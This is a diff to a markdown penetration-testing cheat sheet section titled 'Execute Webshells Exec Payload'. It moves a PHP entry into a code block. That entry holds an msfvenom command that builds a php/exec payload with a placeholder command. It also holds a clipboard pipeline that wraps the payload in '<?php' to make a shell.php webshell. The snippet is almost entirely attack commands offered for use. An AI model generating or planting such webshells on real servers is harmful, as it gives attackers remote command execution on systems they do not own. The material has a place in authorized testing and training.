@@ -2,8 +2,10 @@
 
 ## Execute Webshells Exec Payload
 
-- **PHP**
+### 01 - PHP
 
-`$ msfvenom -p php/exec cmd=<commands> -f raw -o exec.php`
+```
+$ msfvenom -p php/exec cmd="<commands>" -f raw -o exec.php
 
-`$ cat exec.php | xclip -selection clipboard && echo '<?php ' | tr -d '\n'> shell.php && xclip -selection clipboard -o >> exec.php`
+$ cat exec.php | xclip -selection clipboard && echo '<?php ' | tr -d '\n'> shell.php && xclip -selection clipboard -o >> exec.php
+```
